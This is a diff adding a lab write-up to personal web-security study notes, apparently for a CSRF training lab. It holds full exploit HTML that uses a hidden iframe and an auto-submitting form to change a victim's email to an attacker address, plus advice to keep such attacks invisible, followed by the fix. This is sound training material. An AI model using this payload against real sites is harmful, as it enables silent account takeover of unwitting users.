@@ -2525,7 +2525,46 @@ testing methodology: find a state-changing action -> check if it uses
   present but ignored) -> if missing/unvalidated, build a PoC page
   (auto-submitting form or img tag) to prove exploitability
   
-                                                              
+Lab 1 — CSRF vulnerability with no defenses — DONE
+credentials: wiener:peter (own account, self-targeting per lab design)
+
+verified all 3 CSRF conditions before building the exploit:
+  1. relevant/state-changing action -- POST /my-account/change-email
+  2. cookie-based session handling -- confirmed via Cookie: session=...
+     in the request, server relies purely on this to identify the user
+  3. no unpredictable parameters -- request body was ONLY email=...,
+     no CSRF token, no re-entered password, nothing attacker doesn't
+     already fully control
+
+exploit HTML:
+  <html><body>
+    <h1>Hello World</h1>
+    <iframe style="display:none" name="csrf-iframe"></iframe>
+    <form action="https://TARGET/my-account/change-email" method="post"
+          target="csrf-iframe" id="csrf-form">
+      <input type="hidden" name="email" value="attacker-controlled@evil.com">
+    </form>
+    <script>document.forms[0].submit()</script>
+  </body></html>
+  hosted on exploit server -- victim visiting the page triggers auto-submit
+
+why the hidden iframe matters (stealth technique, not just lab formality):
+  WITHOUT target="csrf-iframe": form submission navigates the ENTIRE
+  visible page to the response -- victim sees a blank/odd page, a visible
+  clue something happened
+  WITH hidden iframe target: form response loads INSIDE the invisible
+  iframe -- victim's visible page (Hello World) never changes at all --
+  attack is completely invisible while state change happens silently
+  general technique: always target form submissions to a hidden iframe
+  in real CSRF PoCs, not just when a lab explicitly requires it
+
+why it exists: server performs the email change based purely on a valid
+               session cookie, no proof the USER actually intended this
+               specific request (matches the CSRF root cause exactly)
+fix: implement a CSRF token validated server-side on this endpoint (see
+     CSRF theory section) and/or SameSite cookie attribute
+     
+                                                                   
 ======================================================
 THINGS I STILL NEED TO PRACTICE
 ======================================================
